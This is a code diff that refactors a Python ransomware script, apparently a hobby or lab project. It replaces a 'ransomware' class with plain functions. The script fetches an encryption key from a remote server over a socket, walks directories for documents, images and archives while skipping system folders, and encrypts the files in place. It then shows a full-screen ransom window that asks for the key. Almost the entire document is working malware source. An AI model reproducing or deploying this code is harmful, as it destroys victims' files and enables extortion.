@@ -7,60 +7,67 @@ from tkinter import messagebox
 
 #python -m PyInstaller --onefile -w encrypt.py
 
+#get key from server
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 IP_ADDRESS = 'SERVER IP HERE'
 PORT = 9090
 client_socket.connect((IP_ADDRESS, PORT))
 key = client_socket.recv(1024)
 
+# code to find and encrypt files
 
-class ransomware:
-    EXCLUDED_DIRECTORIES = ('Program Files',
-                            'Program Files (x86)',
-                            'Windows',
-                            '$Recycle.Bin',
-                            'AppData',
-                            #'paths',
-            )
-    
-    EXTENSIONS = (
-            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
-            '.odt', '.odp', '.ods', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
-            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
-            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
-    )
-    
-    def find_files(self):
-        file_paths = []
-        directory = r'TEST\DIRECTORY\HERE'
-        #f = open("paths/path.txt","w")
-        for root, dirs, files in os.walk(directory):
-            if any(s in root for s in self.EXCLUDED_DIRECTORIES):
-                pass
-            else:
-                for file in files:
-                    if file.endswith(self.EXTENSIONS):
-                        TARGET = os.path.join(root, file)
-                        file_paths.append(TARGET)
-                        #f.write(TARGET+'\n')
-                        print(root)
-        #f.close()
-        return file_paths
-                        
-    
-    def encrypt_files(self, filename):
-        fernet = Fernet(key)
-        with open(filename, "rb") as file:
-            file_content = file.read()
-        encrypted_content = fernet.encrypt(file_content)
-        with open(filename, "wb") as file:
-            file.write(encrypted_content)
-        print(filename)
+EXCLUDED_DIRECTORIES = ('Program Files',
+                        'Program Files (x86)',
+                        'Windows',
+                        '$Recycle.Bin',
+                        'AppData',
+                        #'paths',
+        )
+
+EXTENSIONS = ( 
+        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
+        '.odt', '.odp', '.ods', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
+        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
+        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
+)
+
+def find_files():
+    file_paths = []
+    directory = r'TEST\DIRECTORY\HERE'
+    #f = open("paths/path.txt","w")
+    for root, dirs, files in os.walk(directory):
+        if any(s in root for s in EXCLUDED_DIRECTORIES):
+            pass
+        else:
+            for file in files:
+                if file.endswith(EXTENSIONS):
+                    TARGET = os.path.join(root, file)
+                    file_paths.append(TARGET)
+                    #f.write(TARGET+'\n')
+                    print(root)
+    #f.close()
+    return file_paths
+                    
+
+def encrypt_file(filename):
+    fernet = Fernet(key)
+    with open(filename, "rb") as file:
+        file_content = file.read()
+    encrypted_content = fernet.encrypt(file_content)
+    with open(filename, "wb") as file:
+        file.write(encrypted_content)
+    print(filename)
 
 
 
-ransomware = ransomware()   
-file_paths = ransomware.find_files()
+ 
+file_paths = find_files()
+
+
+def encrypt_all():
+    for file in file_paths:
+        current_file = file.strip()
+        encrypt_file(current_file)
 
 
 def decryption_screen():
@@ -90,7 +97,7 @@ def decryption_screen():
     labe4.config(background='black',foreground='red')
     labe4.pack(anchor='n', ipady=20)
     
-    def decrypt_files():
+    def decrypt_all():
         try:
             user_input = entry.get()
             if user_input != key.decode():
@@ -118,29 +125,19 @@ def decryption_screen():
     canvas1 = tk.Canvas(root, bg='black', highlightthickness=0, height=20, width=screen_width)
     canvas1.pack()
 
-    key_submit = tk.Button(root, text='Submit', command=decrypt_files)
+    key_submit = tk.Button(root, text='Submit', command=decrypt_all)
     key_submit.pack(anchor='n')
 
     root.mainloop()
 
 
-def ransom():
-    #filepath = 'paths/path.txt'
-    for file in file_paths:
-        current_file = file.strip()
-        ransomware.encrypt_files(current_file)
-
-#    with open(filepath) as file:
-#        line = file.readline()
-#       while line:
-#           filename = line.strip()
-#           ransomware.encrypt_files(filename)
-#           line = file.readline()
-#        file.close()
 
 
+
+
+#TODO if already encrypted only show decryption menu, else: encrypt then show menu
 if __name__ == '__main__':
     #if path.exists("paths") is False:
     #    os.mkdir("paths")
-    ransom()
+    encrypt_all()
     decryption_screen()
